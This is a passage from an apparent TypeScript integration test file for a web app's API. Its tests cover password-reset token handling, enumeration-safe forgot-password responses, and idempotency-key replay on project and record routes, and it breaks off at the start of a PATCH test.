      const resetToken = new URL(resetUrl!).searchParams.get("resetToken");
      assert.ok(resetToken, "the reset link must carry a resetToken query param");

      const resetPromise = fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: resetToken, newPassword: "brand-new-password" }),
      });
      // DELETE has no genuine await of its own in this scenario (no
      // projects, no live WhatsApp connection), so it needs a short head
      // start for its synchronous session-revocation to land genuinely
      // inside reset-password's own scrypt await, not before reset-
      // password's handler has even begun -- mirrors the PATCH-vs-DELETE
      // race test's own identical convention above.
      await new Promise((resolve) => setTimeout(resolve, 20));
      const deleteRes = await fetch(`${baseUrl}/api/auth/account`, { method: "DELETE", headers: authHeaders(token) });
      assert.equal(deleteRes.status, 204);

      const resetRes = await resetPromise;
      assert.notEqual(resetRes.status, 204, "must not report success once the account it targets no longer exists");
      assert.equal(resetRes.status, 401);
      assert.equal(((await resetRes.json()) as { code?: string }).code, "USER_NOT_FOUND");

      const reSignupRes = await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "whatever-password" }),
      });
      assert.equal(
        reSignupRes.status,
        201,
        "the email must be free to re-register -- the account was genuinely deleted, not left in some half-updated state",
      );
    },
    { emailSender },
  );
});

test("forgot-password for an email with no account still returns the exact same generic success response, and sends no email at all", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const res = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: "no-such-account@example.com", lang: "en" }),
      });
      assert.equal(res.status, 200, "must never reveal that this email has no account via a different status code");
      assert.deepEqual(
        await res.json(),
        { sent: true },
        "must never reveal that this email has no account via a different response body",
      );
      assert.equal(emailSender.sentTo.length, 0, "no real account to email, so nothing should actually be sent");
    },
    { emailSender },
  );
});

test("forgot-password returns a clear EMAIL_NOT_CONFIGURED error when no EmailSender is set up, instead of a silent no-op", async () => {
  await withServer(async (baseUrl) => {
    // The default withServer (no emailSender option) uses createApp's own
    // default, same as a real deployment with no RESEND_API_KEY set.
    const res = await fetch(`${baseUrl}/api/auth/forgot-password`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "dana@example.com", lang: "en" }),
    });
    assert.equal(res.status, 503);
    assert.equal(((await res.json()) as { code?: string }).code, "EMAIL_NOT_CONFIGURED");
  });
});

test("reset-password rejects a garbage/unknown token, and an expired one, both with RESET_TOKEN_INVALID", async () => {
  await withServer(async (baseUrl, db) => {
    const garbageRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token: "this-token-was-never-issued", newPassword: "whatever-password" }),
    });
    assert.equal(garbageRes.status, 401);
    assert.equal(((await garbageRes.json()) as { code?: string }).code, "RESET_TOKEN_INVALID");

    // An already-expired row, inserted directly (bypassing the real
    // 1-hour TTL) -- same technique passwordResetTokens.test.ts's own
    // pruneExpiredPasswordResetTokens test uses to exercise expiry without
    // actually waiting an hour.
    const email = `expired-reset-${Date.now()}@example.com`;
    await signup(baseUrl, email);
    const expiredToken = "expired-raw-token";
    const expiredHash = createHash("sha256").update(expiredToken).digest("hex");
    db.prepare(
      "INSERT INTO password_reset_tokens (id, userId, tokenHash, expiresAt, createdAt) SELECT ?, id, ?, ?, ? FROM users WHERE email = ?",
    ).run(randomUUID(), expiredHash, new Date(Date.now() - 60 * 60 * 1000).toISOString(), new Date().toISOString(), email);

    const expiredRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token: expiredToken, newPassword: "whatever-password" }),
    });
    assert.equal(expiredRes.status, 401);
    assert.equal(((await expiredRes.json()) as { code?: string }).code, "RESET_TOKEN_INVALID");
  });
});

test("requesting a fresh reset token invalidates the previous one for the same account", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await signup(baseUrl, email);

      await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });
      const firstUrl = emailSender.sentTo[0]!.text.match(/https?:\/\/\S+/)![0];
      const firstToken = new URL(firstUrl).searchParams.get("resetToken")!;

      await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });

      const firstAttemptRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: firstToken, newPassword: "whatever-password" }),
      });
      assert.equal(firstAttemptRes.status, 401, "the first (now-superseded) token must no longer work");
      assert.equal(((await firstAttemptRes.json()) as { code?: string }).code, "RESET_TOKEN_INVALID");
    },
    { emailSender },
  );
});

/**
 * Round 1296: regression test for a real bug -- deletePasswordResetTokensForUser
 * + createPasswordResetToken ran unconditionally after the send()
 * try/catch, regardless of whether the send actually succeeded. A second
 * forgot-password request (well within forgotPasswordRateLimiter's own
 * cap) whose own email send fails transiently used to delete the FIRST
 * request's already-delivered, still-valid token and replace it with a
 * new one that was never delivered -- leaving the account with zero
 * working reset links and a response that still claimed success either
 * way (by this route's own deliberate design, to avoid an account-
 * enumeration oracle). The fix moves the DB write to only run once send()
 * has resolved, mirroring the login-code route's own established
 * ordering fix for the identical class of hazard (round 538).
 */
test("a transient send failure on a second forgot-password request does not invalidate the first request's already-delivered token", async () => {
  const emailSender = createFakeEmailSender({ failWith: new Error("simulated provider outage"), failFromCall: 2 });
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await signup(baseUrl, email);

      const firstRes = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });
      assert.equal(firstRes.status, 200);
      const firstUrl = emailSender.sentTo[0]!.text.match(/https?:\/\/\S+/)![0];
      const firstToken = new URL(firstUrl).searchParams.get("resetToken")!;

      // The second request's own send() fails (simulated transient outage),
      // but the response must still claim success -- same enumeration-
      // avoidance contract as every other outcome of this route.
      const secondRes = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, lang: "en" }),
      });
      assert.equal(secondRes.status, 200);
      assert.equal(emailSender.sentTo.length, 1, "the second, failed send must not have been recorded as delivered");

      const firstAttemptRes = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: firstToken, newPassword: "whatever-password" }),
      });
      assert.equal(
        firstAttemptRes.status,
        204,
        "the first request's own token, which WAS successfully delivered, must still work after a later request's send failed",
      );
    },
    { emailSender },
  );
});

test("project routes reject requests without a valid session", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/projects`);
    assert.equal(res.status, 401);
    assert.equal(((await res.json()) as { code?: string }).code, "AUTH_REQUIRED");
    const bad = await fetch(`${baseUrl}/api/projects`, { headers: { authorization: "Bearer nope" } });
    assert.equal(bad.status, 401);
    assert.equal(((await bad.json()) as { code?: string }).code, "SESSION_EXPIRED");
  });
});

/**
 * The real scenario docs/wakeRetry-idempotency-design.md (round 470) was
 * written for and round 471 implements for this route: a connection that
 * drops *after* the server already fully finished creating a project but
 * *before* the response made it back to the browser, so
 * fetchWithWakeRetry (apps/web/src/wakeRetry.ts) retries the exact same
 * POST with the exact same `X-Idempotency-Key` it generated once for this
 * call (apps/web/src/api.ts's createProject). Reproduced here the same
 * way the design doc frames it: from the server's own point of view, a
 * genuine network-level retry and this test's second identical fetch are
 * indistinguishable -- both are just "the same key arriving twice, the
 * second time after the first request already finished." Without the
 * fix, each of the two fetches below would call generateSpec() (a second
 * real AI call) and insertProject() again, leaving the user with a
 * confusing, orphaned second draft project they never asked for.
 */
test("POST /projects retried with the same idempotency key after the first attempt already finished replays the original response instead of creating a second project", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const headers = { ...authHeaders(token), "x-idempotency-key": "repro-key-1" };
    const firstRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers,
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { project: { id: string }; providerName: string };

    const retryRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers,
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    assert.equal(retryRes.status, 201);
    const retry = (await retryRes.json()) as { project: { id: string }; providerName: string };
    assert.equal(retry.project.id, first.project.id, "the retry must return the exact same project, not a newly created one");
    assert.deepEqual(retry, first, "the replayed response must be identical to what the first attempt actually returned");

    const listRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(token) });
    const { projects } = (await listRes.json()) as { projects: { id: string }[] };
    assert.equal(projects.length, 1, "exactly one project must exist -- the retry must not have inserted a second row");
  });
});

test("POST /projects with no idempotency key behaves exactly as before: two identical requests create two separate projects", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);
    const headers = authHeaders(token);
    const firstRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers,
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const secondRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers,
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const first = (await firstRes.json()) as { project: { id: string } };
    const second = (await secondRes.json()) as { project: { id: string } };
    assert.notEqual(first.project.id, second.project.id, "with no key supplied, the guard must not apply at all -- this is a genuinely new feature, opted into per call site");

    const listRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(token) });
    const { projects } = (await listRes.json()) as { projects: { id: string }[] };
    assert.equal(projects.length, 2);
  });
});

test("POST /projects with the same idempotency key arriving while the first request is still genuinely in flight is rejected with 409 DUPLICATE_REQUEST_IN_PROGRESS, instead of running a second concurrent AI call", async () => {
  const gated = createGatedProvider();
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl);
      const headers = { ...authHeaders(token), "x-idempotency-key": "concurrent-key" };

      gated.arm();
      const firstPromise = fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers,
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      firstPromise.catch(() => {});
      await gated.waitUntilStarted();

      const secondRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers,
        body: JSON.stringify({ description: "A different description entirely." }),
      });
      let secondBody: { code?: string } = {};
      try {
        secondBody = (await secondRes.json()) as { code?: string };
      } finally {
        gated.release();
      }
      assert.equal(secondRes.status, 409);
      assert.equal(secondBody.code, "DUPLICATE_REQUEST_IN_PROGRESS");

      const firstRes = await firstPromise;
      assert.equal(firstRes.status, 201);
    },
    { provider: gated.provider },
  );
});

/**
 * Round 472 extends the same withIdempotency() mechanism (proven on
 * POST /projects in round 471) to the other two routes
 * docs/wakeRetry-idempotency-design.md flagged as sharing the identical
 * unguarded `insertProject(db, { id: randomUUID(), ... })` shape:
 * from-template and clone. Same repro as round 471's own test: the same
 * X-Idempotency-Key sent twice, the second time after the first request
 * already fully finished, must replay the original response instead of
 * creating a second project.
 */
test("POST /projects/from-template retried with the same idempotency key after the first attempt already finished replays the original response instead of creating a second project", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "from-template-idem1@example.com");
    const headers = { ...authHeaders(token), "x-idempotency-key": "from-template-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers,
      body: JSON.stringify({ templateId: "crm" }),
    });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { project: { id: string } };

    const retryRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers,
      body: JSON.stringify({ templateId: "crm" }),
    });
    assert.equal(retryRes.status, 201);
    const retry = (await retryRes.json()) as { project: { id: string } };
    assert.equal(retry.project.id, first.project.id, "the retry must return the exact same project, not a newly created one");

    const listRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(token) });
    const { projects } = (await listRes.json()) as { projects: { id: string }[] };
    assert.equal(projects.length, 1, "exactly one project must exist -- the retry must not have inserted a second row");
  });
});

test("POST /projects/:id/clone retried with the same idempotency key after the first attempt already finished replays the original response instead of creating a second clone", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "clone-idem1@example.com");
    const sourceRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: source } = (await sourceRes.json()) as { project: { id: string } };

    const headers = { ...authHeaders(token), "x-idempotency-key": "clone-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${source.id}/clone`, { method: "POST", headers });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { project: { id: string } };

    const retryRes = await fetch(`${baseUrl}/api/projects/${source.id}/clone`, { method: "POST", headers });
    assert.equal(retryRes.status, 201);
    const retry = (await retryRes.json()) as { project: { id: string } };
    assert.equal(retry.project.id, first.project.id, "the retry must return the exact same cloned project, not a new one");

    const listRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(token) });
    const { projects } = (await listRes.json()) as { projects: { id: string }[] };
    // source + exactly one clone, never two clones.
    assert.equal(projects.length, 2, "exactly one source project and one clone must exist -- the retry must not have inserted a second clone");
  });
});

/**
 * Round 473 extends the same withIdempotency() mechanism to the
 * append-only gap docs/wakeRetry-idempotency-design.md identified in
 * POST /projects/:id/roles, /assumptions, /entities, and
 * /entities/:name/fields -- a retry with the same key after the first
 * append already finished must not append the same role/assumption/
 * entity/field a second time.
 */
test("POST /projects/:id/roles retried with the same idempotency key after the first attempt already finished replays the original response instead of appending a second role", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    const originalRoleCount = project.spec.roles.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "role-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers,
      body: JSON.stringify({ role: "Warehouse Manager" }),
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(first.project.spec.roles.length, originalRoleCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers,
      body: JSON.stringify({ role: "Warehouse Manager" }),
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(retry.project.spec.roles, first.project.spec.roles, "the retry must replay the original response, not append a second role");
  });
});

/**
 * Regression test for a real bug found by round 528's Explore survey:
 * withIdempotency's own mismatch guard (idempotency.ts) compares
 * `existing.route` against the *current* request's `route` argument, but
 * every real call site in this file used to pass the bare Express route
 * template ("POST /projects/:id/roles"), never the actual project id --
 * so the same key reused across two different projects by the same user
 * matched on both userId and route, silently replaying the first
 * project's cached response and skipping the second project's own role
 * append entirely, with no error surfaced. Fixed by interpolating the
 * real project id into the route string passed to withIdempotency, so a
 * cross-project reuse is now correctly rejected with 409
 * IDEMPOTENCY_KEY_MISMATCH -- the same outcome round 495 already
 * established for a cross-user or cross-endpoint-type reuse -- instead of
 * silently returning project A's stale data and skipping project B's own
 * mutation.
 */
test("POST /projects/:id/roles for two different projects with the same reused idempotency key rejects the second request outright, instead of silently replaying the first project's cached response and skipping the second project's own mutation", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-idem-cross-project@example.com");
    const createA = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project: projectA } = (await createA.json()) as { project: { id: string; spec: { roles: string[] } } };
    const createB = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "An inventory tracker for a warehouse." }),
    });
    const { project: projectB } = (await createB.json()) as { project: { id: string; spec: { roles: string[] } } };
    const originalRolesB = projectB.spec.roles.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "cross-project-reused-key" };
    const resA = await fetch(`${baseUrl}/api/projects/${projectA.id}/roles`, {
      method: "POST",
      headers,
      body: JSON.stringify({ role: "Warehouse Manager" }),
    });
    assert.equal(resA.status, 200);

    const resB = await fetch(`${baseUrl}/api/projects/${projectB.id}/roles`, {
      method: "POST",
      headers,
      body: JSON.stringify({ role: "Loading Dock Supervisor" }),
    });
    assert.equal(resB.status, 409, "reusing project A's key for project B must be rejected outright, not silently replay project A's cached response as if it were a success");
    const bodyB = (await resB.json()) as { code: string };
    assert.equal(bodyB.code, "IDEMPOTENCY_KEY_MISMATCH");

    const projectBRes = await fetch(`${baseUrl}/api/projects/${projectB.id}`, { headers: authHeaders(token) });
    const { project: projectBAfter } = (await projectBRes.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(
      projectBAfter.spec.roles.length,
      originalRolesB,
      "project B must be completely untouched -- neither silently mutated with project A's role nor left in some partial state",
    );

    // A fresh key for project B must still work normally.
    const retryHeaders = { ...authHeaders(token), "x-idempotency-key": "project-b-own-fresh-key" };
    const resBRetry = await fetch(`${baseUrl}/api/projects/${projectB.id}/roles`, {
      method: "POST",
      headers: retryHeaders,
      body: JSON.stringify({ role: "Loading Dock Supervisor" }),
    });
    assert.equal(resBRetry.status, 200);
    const bodyBRetry = (await resBRetry.json()) as { project: { spec: { roles: string[] } } };
    assert.equal(bodyBRetry.project.spec.roles.length, originalRolesB + 1, "a fresh key for project B must append its own role normally");
    assert.ok(bodyBRetry.project.spec.roles.includes("Loading Dock Supervisor"));
  });
});

test("POST /projects/:id/assumptions retried with the same idempotency key after the first attempt already finished replays the original response instead of appending a second assumption", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    const originalCount = project.spec.assumptions.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "assumption-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers,
      body: JSON.stringify({ assumption: "Each customer has exactly one primary contact." }),
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.equal(first.project.spec.assumptions.length, originalCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers,
      body: JSON.stringify({ assumption: "Each customer has exactly one primary contact." }),
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(
      retry.project.spec.assumptions,
      first.project.spec.assumptions,
      "the retry must replay the original response, not append a second assumption",
    );
  });
});

test("POST /projects/:id/entities retried with the same idempotency key after the first attempt already finished replays the original response instead of adding a second entity", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const originalCount = project.spec.entities.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "entity-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers,
      body: JSON.stringify({ label: "Loyalty Program" }),
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(first.project.spec.entities.length, originalCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers,
      body: JSON.stringify({ label: "Loyalty Program" }),
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      retry.project.spec.entities,
      first.project.spec.entities,
      "the retry must replay the original response, not add a second entity",
    );
  });
});

test("POST /projects/:id/entities/:entityName/fields retried with the same idempotency key after the first attempt already finished replays the original response instead of adding a second field", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: unknown[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const originalFieldCount = project.spec.entities[0].fields.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "field-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers,
      body: JSON.stringify({ label: "Phone Number" }),
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { entities: { name: string; fields: unknown[] }[] } } };
    const firstEntity = first.project.spec.entities.find((e) => e.name === entityName)!;
    assert.equal(firstEntity.fields.length, originalFieldCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers,
      body: JSON.stringify({ label: "Phone Number" }),
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { entities: { name: string; fields: unknown[] }[] } } };
    assert.deepEqual(retry.project.spec, first.project.spec, "the retry must replay the original response, not add a second field");
  });
});

/**
 * Round 594's Explore survey found that docs/wakeRetry-idempotency-design.md's
 * own inventory of mutating routes never mentioned
 * POST /projects/:id/entities/:entityName (record creation) at all, and the
 * route itself called insertRecord() with no withIdempotency() guard -- unlike
 * every other unguarded-insert route the design doc did flag and rounds
 * 471-474 already fixed. A dropped connection after the server finished
 * inserting a real record but before the response reached the browser would
 * make fetchWithWakeRetry (apps/web/src/wakeRetry.ts) resend the identical
 * POST with the identical X-Idempotency-Key createRecord (apps/web/src/api.ts)
 * generates, creating a duplicate record the user never asked for. Fixed the
 * same way as the sibling /entities (add spec-entity) route: wrapped in
 * withIdempotency(), with the fire-and-forget automation trigger moved inside
 * the guarded callback so a replayed retry doesn't fire it twice.
 */
test("POST /projects/:id/entities/:entityName retried with the same idempotency key after the first attempt already finished replays the original response instead of inserting a second record", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "record-create-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      project.spec.entities.map((e) => e.name).sort(),
      ["Courier", "Order"],
      "this description should match exactly Order (with a courierId relation) and Courier",
    );

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
    await collectSSE(buildRes);

    const beforeRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, { headers: authHeaders(token) });
    const { records: seeded } = (await beforeRes.json()) as { records: { id: number }[] };
    const originalCount = seeded.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "record-create-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "POST",
      headers,
      body: JSON.stringify({ name: "Dave", status: "Available" }),
    });
    assert.equal(firstRes.status, 201);
    const first = (await firstRes.json()) as { record: { id: number } };

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "POST",
      headers,
      body: JSON.stringify({ name: "Dave", status: "Available" }),
    });
    assert.equal(retryRes.status, 201);
    const retry = (await retryRes.json()) as { record: { id: number } };
    assert.equal(retry.record.id, first.record.id, "the retry must return the exact same record, not a newly inserted one");
    assert.deepEqual(retry, first, "the replayed response must be identical to what the first attempt actually returned");

    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, { headers: authHeaders(token) });
    const { records } = (await listRes.json()) as { records: { id: number }[] };
    assert.equal(records.length, originalCount + 1, "exactly one new record must exist -- the retry must not have inserted a second row");
  });
});

/**
 * Round 792's Explore survey found that unlike record create (round 594,
 * just above), PATCH and DELETE on a single record never got
 * withIdempotency protection at all -- neither reads X-Idempotency-Key.
 * For DELETE this is a guaranteed, visible failure, not just a duplication
 * risk: deleteRecord (repository.ts) throws NotFoundError once the row is
 * actually gone, and the route has no special case for it, so it
 * propagates as a real 404. A response lost in transit after the server
 * already deleted the row (a dropped Wi-Fi/mobile connection, not only
 * Render's cold-start case this mechanism was built for) made
 * fetchWithWakeRetry's retry land on an already-deleted row and get back a
 * confusing "not found" error for a delete that, from the user's own point
 * of view, already fully succeeded -- EntityPanel.tsx's
 * commitPendingDelete then restores the (already gone) row into the UI
 * and shows that error.
 */
/**
 * Round 1162: findEntity (this file's own per-route entity resolver,
 * used by GET/POST/PATCH/DELETE .../entities/:entityName and its many
 * sub-routes) used to do an exact-case match against the spec's entity
 * names. A relation field's own relationTo can legitimately differ from
 * its target entity's real name only by letter case (the same genuinely
 * plausible AI-generated-spec scenario migrate.ts's own round-1159 fix
 * addresses for FK generation) -- EntityPanel.tsx's own relationTargets
 * fetch (and AutomationsPanel.tsx's identical pattern) passes that raw
 * relationTo string straight through as this route's own :entityName
 * param, so this exact-case lookup 404ed that request even though the
 * real FK underneath is intact, silently leaving the live table/board's
 * relation cells on "#<id>" with no related records ever fetched.
 */
test("GET .../entities/:entityName resolves the entity even when the URL's own entityName differs from its real name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `entity-case-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Customer", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    const record = insertRecord(db, projectId, spec.entities[0], { name: "Dana Levi" });

    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/customer`, { headers: authHeaders(token) });
    assert.equal(res.status, 200, "must resolve the real Customer entity even though the URL spells it lowercase customer");
    const { records } = (await res.json()) as { records: { id: number; name: string }[] };
    assert.deepEqual(
      records.map((r) => r.id),
      [record.id],
    );
  });
});

test("DELETE .../entities/:entityName/:recordId retried with the same idempotency key after the first attempt already succeeded replays the original 204, instead of 404ing on the now-deleted row", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `delete-idem-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Customer", fields: [{ name: "name", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    const record = insertRecord(db, projectId, spec.entities[0], { name: "Dana Levi" });

    const headers = { ...authHeaders(token), "x-idempotency-key": "delete-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "DELETE",
      headers,
    });
    assert.equal(firstRes.status, 204);

    const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
      method: "DELETE",
      headers,
    });
    assert.equal(
      retryRes.status,
      204,
      "a retried delete with the same idempotency key must replay the original success, not 404 on the already-deleted row",
    );

    const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, { headers: authHeaders(token) });
    const { records } = (await listRes.json()) as { records: { id: number }[] };
    assert.equal(records.length, 0, "the record must still be gone -- the replay must not have somehow resurrected it");
  });
});

/**
 * Round 792: same withIdempotency extension as DELETE just above, for
 * PATCH -- but a retried PATCH re-sending the exact same body it sent
 * before is naturally idempotent at the storage level on its own
 * (updateRecord just rewrites the same value back), so a test that only
 * re-sends the identical request can't tell a guarded retry from an
 * unguarded one -- both land on the same final state by coincidence, not
 * because anything guarded the second run.
 *
 * The real, observable harm needs a THIRD edit landing in between the
 * first attempt and the lost-response retry (a collaborator's own PATCH,
 * using no idempotency key of its own, racing in while the first
 * caller's response never reached them): without the fix, the retry
 * genuinely re-runs updateRecord with its own stale body and clobbers
 * that collaborator's newer edit back to the stale value. With the fix,
 * the retry is a pure cached replay -- updateRecord never runs a second
 * time, so the collaborator's edit survives untouched in the database
 * (even though the stale cached response handed back to the retrying
 * client still reads the original value it itself sent).
 */
test("PATCH .../entities/:entityName/:recordId retried with the same idempotency key after a collaborator's own edit lands in between does not clobber that edit", async () => {
  await withServer(async (baseUrl, db) => {
